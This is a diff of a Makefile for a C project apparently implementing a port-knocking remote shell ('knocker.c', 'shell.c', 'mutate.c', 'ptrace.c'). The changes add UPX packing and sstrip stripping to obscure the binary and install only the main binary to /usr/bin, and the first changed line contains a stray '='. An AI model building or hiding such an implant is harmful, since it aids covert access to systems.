@@ -1,8 +1,11 @@
-CC        := cc
+=CC        := cc
 OUT       := hoxha
 CLIENT    := client
-SRC       := knocker.c shell.c mutate.c
+UPX	 := ./upx
+SSTRIP    := ./sstrip
+SRC       := knocker.c shell.c mutate.c ptrace.c
 BINDIR    := /usr/bin
+CHMOD     := chmod +x
 
 CFLAGS    := -static -s -pipe -march=native -O2 -std=gnu17 -Wall -Wextra -pedantic \
              -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident \
@@ -28,13 +31,16 @@ all: $(OUT) $(CLIENT)
 
 $(OUT): $(SRC)
 	$(CC) $(SRC) -o $@ $(CFLAGS) $(LDFLAGS) $(LIBS)
+	$(CHMOD) $(UPX)
+	$(CHMOD) $(SSTRIP)
+	$(UPX) --best --brute $(OUT)
+	$(SSTRIP) -z $(OUT)
 
 $(CLIENT): client.c
 	$(CC) client.c -o $@ $(CLIENT_CFLAGS) $(CLIENT_LDFLAGS) $(CLIENT_LIBS)
 
 install: all
 	install -Dm755 $(OUT) $(BINDIR)/$(OUT)
-	install -Dm755 $(CLIENT) $(BINDIR)/$(CLIENT)
 
 clean:
 	rm -f $(OUT) $(CLIENT)
